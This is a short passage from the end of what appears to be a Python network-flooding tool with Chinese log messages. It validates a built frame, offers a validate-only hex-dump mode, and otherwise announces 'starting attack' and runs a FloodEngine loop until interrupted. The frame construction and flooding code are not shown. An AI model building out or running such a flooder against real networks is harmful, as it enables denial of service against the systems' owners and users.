    log_info("验证帧结构...")
    validate_frame(builder)
    print()

    if args.validate:
        log_info("仅验证模式，退出")

        # 打印一帧的hex dump用于调试
        frame = builder.build()
        print()
        log_info("帧Hex Dump:")
        hexdump(frame)
        return

    # 启动攻击
    print(f"{'=' * 60}")
    log_info("开始攻击，按 Ctrl+C 停止")
    print(f"{'=' * 60}")
    print()

    engine = FloodEngine(CONFIG, builder)
    engine.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        engine.stop()


if __name__ == "__main__":
    main()
